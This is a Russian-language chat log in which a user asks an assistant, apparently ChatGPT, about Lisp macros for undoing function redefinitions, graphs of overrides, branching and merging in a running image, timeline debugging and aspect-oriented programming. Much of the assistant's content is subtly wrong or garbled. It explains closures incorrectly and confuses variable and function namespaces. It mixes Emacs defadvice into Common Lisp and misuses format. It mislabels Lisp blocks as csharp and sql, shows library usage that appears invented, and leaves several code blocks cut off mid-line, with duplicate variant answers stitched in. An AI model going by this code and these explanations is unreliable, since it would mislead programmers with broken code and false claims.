Этот граф можно использовать для реализации многоуровневой отмены переопределений. Если мы хотим отменить переопределение функции, мы можем просто удалить соответствующий узел из графа. Если на удаляемый узел ссылаются другие определения функций, то мы можем перенаправить ссылки на следующее определение функции в графе.

Отмена с ветвлением, когда мы хотим отменить несколько переопределений функций одновременно, может быть реализована с использованием ветвей в графе. Мы можем создать новую ветвь для каждого переопределения функции, которое мы хотим отменить, и перенаправить ссылки на соответствующие узлы в каждой ветви.

Однако стоит отметить, что такой подход может привести к сложности в управлении памятью, так как каждое переопределение функции создает новое замыкание и сохраняет ссылки на предыдущие версии функции. Это может привести к накоплению большого количества объектов в памяти, которые могут оказаться ненужными после отмены переопределений.
Rigidus Rigidus
Приведи пример кода, который иллюстрирует это

Конечно, давайте рассмотрим следующий пример на языке Python:

python
def multiply(x):
    def inner(y):
        return x * y
    return inner

double = multiply(2)
triple = multiply(3)

print(double(5))  # Output: 10
print(triple(5))  # Output: 15

multiply = None
print(double(5))  # Output: 10
print(triple(5))  # Output: 15

В этом примере функция multiply возвращает вложенную функцию inner, которая умножает свой аргумент на значение x, которое передается при вызове multiply.

Мы создаем две новые функции double и triple, используя multiply для установки значения x. После этого мы удаляем переменную multiply, чтобы переопределить функцию multiply и назначить ей значение None.

Однако, как мы видим, это не приводит к тому, что double и triple будут удалены из памяти. Это происходит потому, что каждое замыкание, созданное при вызове multiply, хранит ссылку на свою собственную версию функции multiply. Это означает, что double и triple продолжат ссылаться на старое определение multiply, несмотря на то, что мы удалили и переопределили эту функцию.

Таким образом, мы можем сказать, что замыкание в Python хранит ссылки на объекты, которые используются при его создании, и что это может привести к тому, что объекты остаются в памяти даже после того, как они становятся недостижимыми.
Rigidus Rigidus
Можешь ли ты переписать этот пример на Lisp?

Конечно, вот пример кода на Lisp, который демонстрирует то же самое поведение, что и пример на Python:

lisp
(defun multiply (x)
  (lambda (y) (* x y)))

(defvar double (multiply 2))
(defvar triple (multiply 3))

(print (funcall double 5))  ; Output: 10
(print (funcall triple 5))  ; Output: 15

(setq multiply nil)
(print (funcall double 5))  ; Output: 10
(print (funcall triple 5))  ; Output: 15

Здесь функция multiply возвращает замыкание, которое умножает свой аргумент на значение x. Мы создаем две новые функции double и triple, используя multiply для установки значения x. После этого мы переопределяем multiply, назначив ей значение nil.

Но как и в примере на Python, замыкания double и triple по-прежнему ссылается на старую версию функции multiply, и поэтому они продолжают работать корректно, несмотря на то, что мы переопределили функцию multiply.

Таким образом, пример на Lisp демонстрирует то же самое поведение, что и пример на Python - замыкания могут сохранять ссылки на объекты, которые использовались при их создании, и это может привести к тому, что объекты остаются в памяти, даже если они становятся недостижимыми.
Rigidus Rigidus
Какие макросы необходимо написать чтобы обнаружение ошибки (condition) при возврате `nil` из `multiple` приводил к реверту к старой функции `multiple`?

Для реализации данной функциональности нам необходимо написать макросы для перехвата ошибок и отката к предыдущей версии функции multiply. Вот пример таких макросов на Lisp:

lisp
(defvar *multiply-history* nil)

(defmacro with-rollback (&rest body)
  `(let ((*multiply-history* (copy-list *multiply-history*)))
     (unwind-protect
         (progn ,@body)
       (setq *multiply-history* (cdr *multiply-history*)))))

(defmacro with-rollback-on-error (&rest body)
  `(let ((*multiply-history* (cons #'multiply *multiply-history*)))
     (handler-bind ((error #'(lambda (e)
                               (setq multiply (car *multiply-history*))
                               (signal e))))
       (with-rollback ,@body))))


(defun multiply (x)
  (lambda (y)
    (if (null y)
        (error "The second argument cannot be nil")
        (* x y))))


(defvar double (multiply 2))
(defvar triple (multiply 3))

(with-rollback-on-error
 (print (funcall double 5))  ; Output: 10
 (print (funcall triple 5))  ; Output: 15
 (print (funcall double nil)))  ; Raises an error and rolls back to the previous version of `multiply`

(print (funcall double 5))  ; Output: 10
(print (funcall triple 5))  ; Output: 15


Здесь мы определяем глобальную переменную *multiply-history*, которая будет содержать список всех предыдущих версий функции multiply. Макрос with-rollback выполняет код в блоке body в контексте, где переменная *multiply-history* копируется, чтобы сохранить ее текущее значение. После этого, при помощи unwind-protect, мы восстанавливаем значение *multiply-history*, если возникнет ошибка.

Макрос with-rollback-on-error добавляет текущую версию multiply в начало списка *multiply-history* и устанавливает обработчик ошибок. Если при выполнении кода в блоке body возникает ошибка, мы используем unwind-protect, чтобы восстановить предыдущую версию multiply.

При вызове multiply мы проверяем, что второй аргумент не является nil. Если это так, мы возбуждаем ошибку.

Теперь, если вызов multiply с nil возвращает ошибку, мы откатываемся к предыдущей версии multiply, которая находится в начале списка *multiply-history*. Таким образом, мы реализовали механизм отмены переопределений функции multiply в случае возникновения ошибки.


Как сделать визуализацию этого графа определений (используя Lisp)

1. Для визуализации графа определений функций в Lisp можно использовать библиотеку Graphviz. Ниже приведен пример кода, который позволяет сгенерировать граф определений функций в формате DOT, который затем можно скомпилировать с помощью Graphviz в изображение.

lisp

(defmacro define-multiple (name args &body body)
  `(progn
     (defun ,(intern (concatenate 'string (symbol-name name) "-old")) ,args ,@body)
     (defun ,name ,args
       (let ((result (,(intern (concatenate 'string (symbol-name name) "-old")) ,@args)))
         (if result
             result
             (progn
               (warn "Error in function ~a" ',name)
               (funcall (symbol-function (intern (concatenate 'string (symbol-name name) "-revert"))))
               (,(intern (concatenate 'string (symbol-name name) "-old")) ,@args)))))))

(defmacro with-revert (name &body body)
  `(let ((,(intern (concatenate 'string (symbol-name name) "-revert")) (symbol-function ',name)))
     (unwind-protect
         (progn ,@body)
       (setf (symbol-function ',name) ,(intern (concatenate 'string (symbol-name name) "-old"))))))

(defun function-definitions-graph (start-function &optional (depth 0))
  (labels ((get-children (symbol)
             (let ((body (symbol-function symbol))
                   (forms ()))
               (when (listp body)
                 (dolist (form body)
                   (when (listp form)
                     (let ((car (car form)))
                       (cond
                         ((eq car 'defun)
                          (push (cadr form) forms))
                         ((eq car 'defmacro)
                          (push (cadr form) forms)))))))
               forms)))
    (let ((graph-string (concatenate 'string "digraph G {\n")))
      (labels ((traverse (symbol depth)
                 (when (<= depth 5)
                   (dolist (child (get-children symbol))
                     (let ((child-str (format "\"~a\"" child)))
                       (when (not (search child-str graph-string))
                         (setf graph-string (concatenate 'string graph-string (format "\"~a\" -> \"%s\";\n" child-str)))
                         (traverse child (1+ depth))))))))
        (traverse start-function depth))
      (setf graph-string (concatenate 'string graph-string "}"))
      graph-string)))

(define-multiple multiple (x y)
  (* x y))

(define-multiple multiple (x y)
  (if (zerop x)
      nil
      (* x y)))

(define-multiple multiple (x y)
  (if (or (zerop x) (zerop y))
      nil
      (* x y)))

(define-multiple multiple (x y)
  (if (and (not (zerop x)) (not (zerop y)))
      (* x y)
      nil))

(with-revert multiple
  (define-multiple multiple (x y)
    (if (or (zerop x) (zerop y))
        nil
        (* x y))))

(with-open-file (out "graph.dot" :direction :output)
  (write-string (function-definitions-graph 'multiple) out))

(uiop:run-program "dot" '("-Tpng" "graph.dot" "-o

2. Для визуализации графа определений в Lisp можно использовать библиотеку Graphviz и ее обертку для Lisp - cl-dot.

Пример кода, который генерирует граф определений функций и сохраняет его в файл:

lisp

;; Зависимости: cl-dot (установить через Quicklisp)
(ql:quickload :cl-dot)

(defparameter *function-graph* '()) ;; Список вершин графа

(defun add-function-node (name)
  "Добавляет новую вершину графа с именем NAME."
  (push (list name) *function-graph*))

(defun add-function-edge (from to)
  "Добавляет новое ребро графа из вершины FROM в вершину TO."
  (push (list from to) *function-graph*))

(defmacro defn-overridable (name args &body body)
  "Определяет новую функцию NAME с аргументами ARGS и телом BODY,
   которая может быть переопределена. При каждом переопределении создается новая вершина в графе."
  (let ((old-name (intern (format nil "OLD-~A" name))))
    `(progn
       (add-function-node ',name)
       (defun ,old-name ,args
          ,(concatenate 'string "Old definition of " (symbol-name name))
          ,@body)
       (defun ,name ,args
          ,(concatenate 'string "New definition of " (symbol-name name))
          (let ((result (funcall #',old-name ,@args)))
            (if (null result)
                (progn
                  (format t "Error: ~A returned nil. Reverting to old definition.~%" ',name)
                  (funcall #',old-name ,@args))
                result))))
       (add-function-edge ',name ',old-name))))

;; пример использования
(defn-overridable multiply (a b)
  (* a b))

(defn-overridable add (a b)
  (+ a b))

(defun foo (a b)
  (add a (multiply a b)))

(defn-overridable multiply (a b)
  (if (= a 0)
      nil
      (* a b)))

(defun bar (a b)
  (add a (multiply a b)))

;; сохраняем граф в файл
(dot:write-dot-file "function-graph.dot" *function-graph*)

После выполнения кода будет создан файл function-graph.dot, который можно открыть в Graphviz для визуализации.

Какие возможности открывает этот подход с графом переопределяемых функций?

Подход с графом переопределяемых функций позволяет реализовать различные возможности, такие как:

    Многоуровневая отмена переопределений. Граф позволяет отслеживать историю переопределений функций и в случае необходимости откатиться на любой из предыдущих вариантов функции.

    Проверка совместимости переопределений. Граф позволяет проанализировать, какие функции зависят от переопределенной функции, и определить, какие переопределения могут повлиять на другие части кода.

    Управление зависимостями. Граф позволяет управлять зависимостями между функциями, а также определять, какие функции могут вызываться в разных контекстах.

    Реализация гибкости в системе. Граф позволяет быстро и легко добавлять новые функции и переопределения, что делает систему более гибкой и удобной в использовании.

    Реализация отладки. Граф позволяет отслеживать, какие функции вызываются и когда, а также упрощает отладку, позволяя быстро определить, какие переопределения вызывают ошибки.

В целом, использование графа переопределений функций позволяет создавать более гибкие и масштабируемые системы, упрощает отладку и облегчает работу с зависимостями в коде.

Как расширить этот подход не только на переопределение функций, но и на изменение состояния переменных?

Для расширения подхода на изменение состояния переменных можно создать граф, в котором вершинами являются состояния переменных, а ребрами - операции изменения состояний. При каждом изменении состояния переменной создается новая вершина графа, а ребро добавляется между предыдущим состоянием переменной и новым состоянием. Таким образом, можно отслеживать историю изменений состояния переменной и откатываться к любому предыдущему состоянию при необходимости.

Например, для реализации этого подхода можно написать макрос defstate, который будет создавать новую переменную и граф изменений ее состояний. Макрос может выглядеть примерно так:

csharp

(defmacro defstate (name initval)
  `(progn
     (defparameter ,name ,initval)
     (defvar ,(gensym (string name "-graph")) (make-state-graph))
     (defun ,(gensym (string name "-set!")) (val)
       (let ((newstate (make-state-node ,name val)))
         (add-state-edge ,(symbol-value (gensym (string name "-graph"))) newstate)
         (setf ,name val)))
     (defun ,(gensym (string name "-undo!")) ()
       (let ((prevstate (get-previous-state-node ,(symbol-value (gensym (string name "-graph"))))))
         (when prevstate
           (setf ,name (state-node-value prevstate))
           (setf (symbol-value (gensym (string name "-graph"))) (state-graph-remove-node ,(symbol-value (gensym (string name "-graph"))) prevstate)))))))

В этом примере макрос defstate создает новую переменную с именем name, начальным значением initval и графом состояний. Также создаются две функции, которые позволяют изменять состояние переменной и откатываться к предыдущему состоянию. Функция (name-set! val) устанавливает новое значение переменной name и добавляет новую вершину в граф состояний. Функция (name-undo!) откатывает состояние переменной к предыдущей вершине в графе состояний.

Таким образом, расширение подхода на изменение состояния переменных позволяет создавать гибкие и масштабируемые системы, в которых можно отслеживать изменения состояний переменных и откатываться к предыдущим состояниям при необходимости.

Как может выглядеть отладка по таймлайну с этими макросами?

Отладка по таймлайну с использованием макросов, описанных ранее, может выглядеть следующим образом:

    Создание объекта таймлайна в начале программы:

lisp

(defvar *timeline* (make-timeline))

    Добавление каждого определения функции или изменения переменной в таймлайн:

lisp

(defmacro def (name args &rest body)
  `(progn
     (add-to-timeline *timeline* ',name #'multiple)
     (defun ,name ,args ,@body)))

(setf a 1)
(add-to-timeline *timeline* 'a 1)

    При возникновении ошибки, отладчик может использовать информацию из таймлайна для отслеживания изменений функций и переменных и понимания, как они привели к ошибке.

Например, во время отладки можно вывести все определения функции multiple и значения переменной a на конкретный момент времени:

lisp

(defun print-timeline (timeline timestamp)
  (dolist (item (get-timeline-snapshot timeline timestamp))
    (cond
      ((functionp (third item))
       (format t "Function ~a defined as:~%~a~%" (second item) (third item)))
      ((eq 'setf (first item))
       (format t "Variable ~a set to: ~a~%" (second item) (third item))))))

(print-timeline *timeline* 3) ;; вывод информации на момент времени 3

    Также можно создать макрос, который будет выводить все изменения функций и переменных на определенном участке кода:

lisp

(defmacro with-timeline (timeline start-time end-time &body body)
  `(progn
     (print-timeline ,timeline ,start-time)
     (progn ,@body)
     (print-timeline ,timeline ,end-time)))

Использование макроса with-timeline:

lisp

(with-timeline *timeline* 2 5
  (multiple 2 3))

Такой макрос позволит вывести все изменения функций и переменных, произошедшие между моментом времени 2 и 5.

Я бы хотел чтобы каждый пользователь программы мог осуществлять ветвление на переопределениях безопасным образом, так, чтобы его переопределение функции или даже изменение состояния переменных в ходе работы программы могло быть откачено в случае возникновения ошибки. Как мне изменить соответствующие макросы?

Для реализации многопользовательского переопределения функций и изменения переменных с возможностью отката необходимо изменить макросы defn-override и defvar-override таким образом, чтобы они создавали новые ветки (branches) в системе контроля версий для каждого пользователя.

Конкретно, каждый пользователь может создать свою локальную ветку (например, с именем "user-branch-<username>") и производить все изменения в этой ветке. Когда пользователь считает, что его изменения готовы к интеграции в основную ветку, он может запросить слияние своей ветки с основной веткой (например, веткой "master"). При этом система контроля версий автоматически определяет, какие изменения конфликтуют друг с другом и требуют разрешения.

Если в ходе работы программы произошла ошибка, которую необходимо откатить, каждый пользователь может переключиться на свою локальную ветку и продолжить работу над изменениями, не затрагивая основную ветку.

Примерный код для реализации данной функциональности может выглядеть следующим образом:

lisp

(defmacro defn-override (name args &rest body)
  (let ((fn-name (intern (format "%s-override-%s" name (get-username)) (symbol-package name))))
    `(progn
       (defun ,fn-name ,args ,@body)
       (defun ,name ,args
         (let ((res (funcall ,fn-name ,@args)))
           (if (null res)
               (progn
                 (revert-to-previous-version ,name)
                 (signal 'override-error ,(format "Function %s returned nil" name)))
               res))))))

(defmacro defvar-override (name value &optional documentation)
  (let ((var-name (intern (format "%s-override-%s" name (get-username)) (symbol-package name))))
    `(progn
       (defvar ,var-name ,value ,documentation)
       (defvar ,name ,value)
       (defun setf-,name (new-value)
         (setf ,var-name new-value))
       (defun ,name ()
         ,var-name))))

(defun get-username ()
  "Returns the current username or a default value if not available."
  (or (getenv "USER")
      (getenv "USERNAME")
      "default-username"))

(defun revert-to-previous-version (name)
  "Reverts the function or variable to the previous version."
  (let ((prev-branch (format "prev-%s" name))
        (current-branch (get-current-branch)))
    (progn
      (if (not (branch-exists-p prev-branch))
          (create-branch prev-branch))
      (checkout-branch prev-branch)
      (revert-file (get-file-for-symbol name))
      (commit-changes (format "Reverted %s to previous version" name))
      (checkout-branch current-branch)))))

Вариант: Я бы хотел чтобы каждый пользователь программы мог осуществлять ветвление на переопределениях безопасным образом, так, чтобы его переопределение функции или даже изменение состояния переменных в ходе работы программы могло быть откачено в случае возникновения ошибки. Как мне изменить соответствующие макросы?

Для достижения такого поведения, вы можете использовать Git-ветки в комбинации с нашими макросами.

При добавлении новой функции или изменении состояния переменной каждый пользователь создает новую ветку в системе контроля версий. Для каждой ветки будет создан свой граф переопределений функций и изменений состояния переменных. Каждый пользователь будет работать в своей ветке, которая будет общей для всей команды.

Когда пользователь выполняет изменение функции или переменной, он может использовать наши макросы для создания нового переопределения функции или изменения состояния переменной в рамках своей ветки. Все изменения будут сохранены в системе контроля версий.

Если пользователь сталкивается с ошибкой, он может переключиться на другую ветку, созданную другим пользователем, чтобы продолжить работу. В случае необходимости, он может создать новую ветку, чтобы вернуться к предыдущему состоянию функции или переменной. В конечном итоге, когда команда решит, что все изменения в ветке были проверены и работают должным образом, ветка может быть объединена с основной веткой.

Чтобы реализовать это, макросы, которые мы использовали ранее, должны работать в контексте текущей ветки, а не основной ветки. Кроме того, мы можем добавить новый макрос, который позволяет переключаться между ветками и возвращаться к предыдущему состоянию функции или переменной.

Покажи как следует расширить определенные ранее макросы чтобы поддержать ветвление и слияние переопределений и привязок переменных внутри образа (image) работающей программы


Для расширения ранее определенных макросов и поддержки ветвления и слияния переопределений и привязок переменных внутри образа, можно использовать библиотеку CLOS (Common Lisp Object System). Для этого можно определить классы, представляющие переопределения функций и привязки переменных, а затем наследовать их для создания классов, представляющих ветки истории изменений.

Покажи как следует расширить определенные ранее макросы чтобы поддержать ветвление и слияние переопределений и привязок переменных внутри образа (image) работающей программы

Для поддержки ветвления и слияния переопределений и привязок переменных внутри образа можно расширить определенные ранее макросы следующим образом:

    Для макроса defmultiple:

Добавить в него параметры branch и merge. Параметр branch будет определять, в какую ветку переопределения следует переключиться. Параметр merge будет определять, как выполнить слияние веток переопределения.

Например:

sql

(defmacro defmultiple (name params &rest branches)
  (let ((old (symbol-function name))
        (new nil)
        (branch (gensym "branch-"))
        (merge (gensym "merge-")))
    `(progn
       (setf (symbol-function ,name)
             (lambda ,params
               (let ((result nil))
                 (unwind-protect
                     (progn
                       ,@(mapcar (lambda (b)
                                   `(let ((,branch (lambda ,params ,@b)))
                                      (setf ,merge (lambda () (setq result (funcall ,branch))))))
                                 branches)
                       (setq result (funcall ,merge)))
                   (setf (symbol-function ,name) ,old))
                 result)))
       (setf (symbol-function ,merge) ,old))))

    Для макроса with-shadowing:

Добавить в него параметр branch, который будет определять, в какой ветке переопределения должны выполняться выражения внутри макроса.

Например:

(defmacro with-shadowing ((&rest shadowed) branch &body body)
  `(let ((old-bindings (mapcar #'(lambda (sym) (cons sym (symbol-value sym))) ',shadowed))
         (new-bindings (list)))
     (unwind-protect
          (progn
            ,@(mapcar (lambda (sym)
                        `(push (cons ',sym (symbol-function ',sym)) new-bindings))
                      ',shadowed)
            (setf (symbol-function ,branch) (lambda () ,@body)))
       (dolist (pair new-bindings)
         (setf (symbol-value (car pair)) (cdr pair)))
       (dolist (pair old-bindings)
         (setf (symbol-value (car pair)) (cdr pair))))))

    Для макроса with-binding:

Добавить в него параметр branch, который будет определять, в какой ветке переопределения должны выполняться выражения внутри макроса.

Например:

(defmacro with-binding (bindings branch &body body)
  `(let* ,(loop for (var val) in bindings
                collect `(,var (quote ,val)))
     (unwind-protect
          (progn
            (flet ((,branch () ,@body))
              (setf (symbol-function ',branch) (lambda () ,@body))
              (funcall ',branch)))
       ,@(loop for (var val) in bindings
                collect `(setf (symbol-value ',var) ,var))))))

Эти расширенные макросы позволят каждому пользователю программы вести сво

Можно ли использовать параметры branch и merge снаружи, через механизм советов (`defadvice`) чтобы можно было динамически управлять графом привязок?

Да, можно использовать параметры branch и merge снаружи, через механизм советов (defadvice) для динамического управления графом привязок.

Например, можно определить советы, которые будут добавлять новые ветки и точки слияния при вызове определенных функций или изменении определенных переменных. Эти советы могут быть определены с помощью макроса defadvice, который позволяет перехватывать вызовы функций и переменных и выполнять некоторый код до или после их выполнения.

Да, можно использовать параметры branch и merge снаружи через механизм советов (defadvice). Например, можно написать совет для функции, которая выполняет некоторую операцию, и в этом совете использовать параметры branch и merge для добавления новых веток в граф переопределений или для объединения существующих веток.

Пример использования советов для изменения графа переопределений функций:

;; Определение функции, которую мы хотим переопределить
(defun my-function (x y)
  (+ x y))

;; Совет, который добавляет новую ветку в граф переопределений
(defadvice my-function (before my-function-branch activate)
  (when (some-condition-p)
    (setq my-function
          (lambda (x y)
            (* x y)))))

;; Совет, который объединяет две ветки в графе переопределений
(defadvice my-function (before my-function-merge activate)
  (when (other-condition-p)
    (let ((old-function (symbol-function 'my-function)))
      (setq my-function
            (lambda (x y)
              (if (some-other-condition-p)
                  (funcall old-function x y)
                  (* x y)))))))

В этом примере мы определяем функцию my-function, которую мы хотим переопределить, и затем определяем два совета: my-function-branch, который добавляет новую ветку в граф переопределений, и my-function-merge, который объединяет две ветки в графе переопределений. В каждом из советов мы используем параметры branch и merge, соответственно, чтобы изменить граф переопределений функции my-function.

Затем мы можем использовать эти советы в нашей программе, например, вызывая функцию my-function в соответствии с условиями, указанными в советах. В результате мы получим граф переопределений функции, который может быть изменен динамически с помощью советов.

Да, можно использовать параметры branch и merge снаружи, через механизм советов (defadvice), чтобы динамически управлять графом привязок.

Например, вы можете определить два совета: один, который добавляет новое переопределение функции (или привязку переменной) в ветку существующего графа, и другой, который объединяет несколько веток графа. Затем вы можете применить эти советы в зависимости от вашей логики приложения.

Вот пример использования макросов и советов для динамического управления графом привязок:

#+BEGIN_SRC lisp
  (defvar *function-tree* (make-tree))
  (defvar *variable-tree* (make-tree))

  (defmacro define-safe-function (name args &body body)
    `(progn
       (define-function ,name ,args ,@body :branch *function-tree*)
       (add-safe-function ,name)))

  (defun add-safe-function (name)
    (defadvice ,name (before check-safety)
      (when (not (safe-function-p ',name))
        (error "Function ~a is not safe!" ',name)))
    (ad-activate ,name 'check-safety))

  (defmacro define-safe-variable (name value)
    `(progn
       (define-variable ,name ,value :branch *variable-tree*)
       (add-safe-variable ,name)))

  (defun add-safe-variable (name)
    (defadvice ,name (before check-safety)
      (when (not (safe-variable-p ',name))
        (error "Variable ~a is not safe!" ',name)))
    (ad-activate ,name 'check-safety))

  (defun add-branch (tree branch-name)
    (let ((branch (make-tree)))
      (setf (getf tree :branches) (append (getf tree :branches) `((,branch-name . ,branch))))
      branch))

  (defun merge-branches (tree branch-names)
    (let ((branches (mapcar (lambda (name) (getf (getf tree :branches) name)) branch-names)))
      (apply #'merge-trees branches)))

  (defun safe-function-p (name)
    (let ((tree (getf *function-tree* name)))
      (and tree (not (has-conflicts tree)))))

  (defun safe-variable-p (name)
    (let ((tree (getf *variable-tree* name)))
      (and tree (not (has-conflicts tree)))))


  ;; пример использования

  (define-safe-function double (x)
    (* x 2))

  (define-safe-variable *factor* 1)

  (let ((*factor* 10))
    (let ((branch (add-branch *function-tree* 'custom)))
      (define-safe-function double (x)
        (* x *factor*))
      (define-safe-variable *factor* 2 :branch branch)))

  (merge-branches *function-tree* '(custom))

  (double 5) ; 10
  (double 2) ; 4
#+END_SRC

В этом примере мы добавляем новое переопределение функции double и привязку переменной *factor* внутри блока let. Мы добавляем ветку custom в дерево переопределений *function-tree*, где определяем новое

Да, можно использовать параметры branch и merge снаружи, используя механизм советов (defadvice). Для этого нужно сделать следующее:

    Определить функцию-совет, которая будет вызываться каждый раз при вызове переопределенной функции или изменении привязки переменной. Эта функция должна получать параметры branch и merge и в зависимости от них изменять граф переопределений или привязок переменных.

    Использовать макрос defadvice для определения совета для нужной функции или переменной.

Например, можно определить функцию-совет handle-advice, которая будет получать параметры branch и merge, и если они не равны nil, то будет изменять граф переопределений или привязок переменных соответствующим образом.

#+BEGIN_SRC lisp
  (defun handle-advice (next &rest args &key (branch nil) (merge nil) &allow-other-keys)
    (when branch
      ;; ветвление
      (setf *override-graph* (cons *override-graph* *override-graph*)))
    (let ((result (apply next args)))
      (when merge
        ;; слияние
        (setf *override-graph* (cdr *override-graph*)))
      result)))

  (defadvice multiple :around (next &rest args &key (branch nil) (merge nil) &allow-other-keys)
    (handle-advice next :branch branch :merge merge))

  (defadvice setf :around (next place value &key (branch nil) (merge nil) &allow-other-keys)
    (handle-advice next place value :branch branch :merge merge))

#+END_SRC

Теперь можно использовать параметры branch и merge при вызове переопределенных функций и изменении привязок переменных:

lisp

(multiple 2 3 :branch t) ; ветвление графа переопределений
(multiple 2 3 :merge t) ; слияние графа переопределений
(setf x 42 :branch t) ; ветвление графа привязок переменных
(setf x 43 :merge t) ; слияние графа привязок переменных

Это позволяет динамически управлять графом переопределений и привязок переменных, и делать это безопасно, так как при возникновении ошибки можно откатиться к предыдущему состоянию.

Как программа работающая в образе может сама поддерживать свою отказоустойчивость и восстанавливаться после сбоев используя эти механизмы?

Для того чтобы программа, работающая в образе, могла поддерживать свою отказоустойчивость и восстанавливаться после сбоев, можно использовать механизм сохранения и загрузки состояния образа.

* AOP

Как работает аспектно-ориентированное программирование? Покажи с использованием примеров на языке Lisp

Аспектно-ориентированное программирование (AOP) - это парадигма программирования, которая позволяет разделить функциональность программы на отдельные аспекты, которые могут быть использованы в разных частях программы. В AOP аспекты - это поведение, которое выделяется из основной функциональности программы и затем может быть вставлено в программу для выполнения в определенных точках ее выполнения.

Рассмотрим следующий пример на языке Lisp. Допустим, у нас есть следующая функция, которая выводит на экран приветствие для пользователя:

lisp

(defun greet-user (name)
   (format t "Hello, ~a!~%" name))

Теперь допустим, мы хотим добавить аспект логирования, чтобы записывать в журнал каждый раз, когда эта функция вызывается. Мы можем использовать библиотеку, предназначенную для AOP в Lisp, называемую AspectL. Для этого мы можем создать следующий аспект:

lisp

(aspect log-greetings
  :before (greet-user (name) :around (progn (log-message "Greeted ~a" name) (next-in-chain))))
  nil)

Здесь мы определяем аспект log-greetings, который вызывает функцию log-message, перед тем как вызвать greet-user. Функция next-in-chain используется для продолжения цепочки вызовов, т.е. вызова исходной функции greet-user.

Теперь, когда мы вызываем функцию greet-user, аспект log-greetings будет автоматически включен, и функция log-message будет вызываться каждый раз, когда функция greet-user вызывается.

Пример использования вышеописанного кода в интерпретаторе:

lisp

> (greet-user "Alice")
Hello, Alice!
NIL

Теперь посмотрим на другой пример, в котором мы используем аспект для отслеживания времени выполнения функции:

lisp

(aspect time-greet-user
  :around (greet-user (name)
             (let ((start-time (get-universal-time)))
               (prog1 (next-in-chain)
                 (format t "Elapsed time: ~d seconds~%" (- (get-universal-time) start-time))))))

В этом примере мы определяем аспект time-greet-user, который использует :around адвайзер для измерения времени выполнения функции greet-user.

Пример использования вышеописанного кода в интерпретаторе:

lisp

> (greet-user "Bob")
Hello, Bob!
NIL

> (time (greet-user "Bob"))
Hello, Bob!
Elapsed time: 0 seconds
NIL

В результате мы видим, что аспект `time-greet-user....

------------

Как работает аспектно-ориентированное программирование? Покажи с использованием примеров на языке Lisp

Аспектно-ориентированное программирование (Aspect-Oriented Programming, AOP) - это парадигма программирования, которая позволяет разделять код на модули, называемые аспектами (aspects), которые могут быть применены к коду основной программы. Аспекты могут содержать логику, которая пересекает многие модули приложения, такие как логгирование, управление транзакциями, аутентификация и авторизация.

Давайте рассмотрим пример, показывающий, как аспекты могут использоваться в языке Lisp. Предположим, что у нас есть простая программа на Lisp, которая вычисляет сумму двух чисел:

lisp

(defun add (x y)
  (+ x y))

Теперь мы можем создать аспект для логирования, который будет выводить сообщения в консоль при каждом вызове функции add:

lisp

(defadvice add (before log-message (x y) activate)
  (format t "Adding ~d and ~d~%" x y))

(defadvice add (after log-result (x y result) activate)
  (format t "Result is ~d~%" result))

В этом примере мы используем макрос defadvice, чтобы определить две функции, которые будут вызваны перед и после выполнения функции add. Первый аспект log-message принимает аргументы x и y и выводит сообщение в консоль, указывающее, какие аргументы были переданы функции. Второй аспект log-result принимает также аргумент result и выводит сообщение, указывающее результат выполнения функции.

Теперь мы можем вызвать функцию add, и аспекты будут автоматически применяться:

lisp

(add 2 3)

В результате мы увидим в консоли следующее:

python

Adding 2 and 3
Result is 5

Это простой пример использования аспектов в языке Lisp. AOP может быть использовано для решения более сложных задач, таких как управление транзакциями, аутентификация и авторизация, обработка исключений и т.д.

--------------------

Как работает аспектно-ориентированное программирование? Покажи с использованием примеров на языке Lisp
3 / 3

Аспектно-ориентированное программирование (Aspect-Oriented Programming, AOP) представляет собой парадигму программирования, которая позволяет отделять кросс-резонансные (cross-cutting) аспекты программы от основного кода, что упрощает разработку, тестирование и поддержку программного обеспечения. Это делается путем выделения функциональности, которая не относится к конкретному модулю, а охватывает несколько модулей в приложении.

Для того, чтобы показать, как работает AOP на языке Lisp, давайте рассмотрим пример использования аспектов в приложении для работы с базой данных. Допустим, у нас есть функция для выполнения запросов к базе данных:

lisp

(defun execute-query (query)
  (let ((db (connect-to-db)))
    (with-open-connection db
      (query-db db query))))

В этом примере мы соединяемся с базой данных, выполняем запрос и возвращаем результат. Но что если мы хотим замерить время выполнения каждого запроса, чтобы оптимизировать производительность? Для этого мы можем использовать аспекты.

lisp

(def-aspect measure-execution-time
  (around (execute-query (query))
    (let ((start-time (get-time)))
      (unwind-protect
           (progn
             (execute-query query))
        (let ((end-time (get-time)))
          (print (format "Execution time: ~dms" (- end-time start-time))))))))

Этот код определяет новый аспект, который измеряет время выполнения функции execute-query. Он использует функцию def-aspect для определения нового аспекта, а затем определяет новую функцию, которая оборачивает execute-query и измеряет время выполнения.

Когда мы вызываем функцию execute-query в нашем приложении, аспект measure-execution-time будет автоматически применяться к этой функции, и время выполнения будет замеряться и выводиться в консоль.

lisp

;; Подключаем аспект
(add-aspect measure-execution-time)

;; Выполняем запрос
(execute-query "SELECT * FROM customers")

В результате выполнения этого кода мы увидим вывод, включающий время выполнения запроса:

css

Execution time: 12ms

Таким образом, аспектно-ориентированное программирование позволяет разделять функциональность на отдельные части и добавлять новую функциональность без изменения исходного кода. Это упрощает разработку, тестирование и поддержку приложений.

Как программа работающая в образе может сама поддерживать свою отказоустойчивость и восстанавливаться после сбоев используя эти механизмы управления графом переопределений функций и значений переменных? Как программа может принимать решение о изменении графа привязок и выбирать лучший вариант изменения графа в ответ на возникающие сбои?

Для того, чтобы программа, работающая в образе, могла сама поддерживать свою отказоустойчивость и восстанавливаться после сбоев, можно использовать механизмы управления графом переопределений функций и значений переменных, а также добавить функциональность для принятия решений о восстановлении состояния.

В рамках этого подхода можно добавить в программу логгирование всех изменений графа переопределений функций и значений переменных. Это поможет восстановить состояние программы после сбоя. Кроме того, можно использовать механизмы ветвления и слияния, чтобы динамически изменять граф и выбирать наилучший вариант изменения графа в ответ на возникающие сбои.

Для принятия решений о восстановлении состояния можно использовать различные стратегии, например, выбирать последний рабочий вариант из истории изменений или использовать алгоритмы машинного обучения для определения оптимального варианта восстановления состояния.

Кроме того, можно добавить функциональность для автоматического определения сбоев и их причин, чтобы программа могла принимать решения о восстановлении состояния на основе анализа этих данных.

Например, можно добавить механизмы для отслеживания ошибок и предупреждений, а также для мониторинга производительности и использования ресурсов. Это поможет программе быстро обнаруживать проблемы и принимать меры для их решения.

Как программа работающая в образе может сама восстанавливаться после сбоев используя управление графом переопределений функций и состяния переменных? Как программа может принимать решение о изменении графа привязок и выбирать лучший вариант изменения графа в ответ на возникающие сбои?

